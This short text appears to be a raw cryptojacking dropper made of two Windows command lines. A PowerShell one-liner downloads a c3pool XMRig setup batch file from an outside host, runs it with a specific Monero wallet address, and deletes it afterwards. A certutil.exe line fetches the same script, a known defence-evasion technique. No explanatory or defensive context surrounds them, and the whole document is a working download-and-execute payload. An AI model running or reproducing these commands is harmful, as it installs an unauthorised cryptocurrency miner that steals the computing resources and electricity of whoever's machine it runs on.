powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.bat', $tempfile); & $tempfile 45bTos1p8u3Z44r5n7SLthQYEwtgqtijLHtFthFhQmiZTu7xN9qTHJz2K9839HgPaRQhmukad3jbuHGZA2Wi7sd6FaAaGth; Remove-Item -Force $tempfile"








certutil.exe -urlcache -split -f http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.bat